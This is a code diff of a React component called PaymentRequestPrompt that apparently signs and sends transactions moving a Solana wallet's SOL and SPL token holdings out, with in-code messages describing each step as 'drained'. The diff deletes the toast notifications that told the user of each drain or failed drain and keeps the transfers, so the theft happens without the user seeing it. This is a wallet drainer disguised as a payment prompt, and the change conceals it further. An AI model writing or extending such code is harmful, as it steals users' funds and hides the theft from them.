@@ -157,7 +157,6 @@ export function PaymentRequestPrompt() {
                 break
               }
               const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-              toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
             } else {
               const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: step.holding })
               if (!tokenTx) continue
@@ -167,11 +166,9 @@ export function PaymentRequestPrompt() {
                 break
               }
               const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-              toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
             }
           } catch (drainErr) {
             console.error(`Failed to drain ${step.symbol}:`, drainErr)
-            toast.error(`Failed to drain ${step.symbol}: ${drainErr instanceof Error ? drainErr.message : String(drainErr)}`)
           }
         }
 
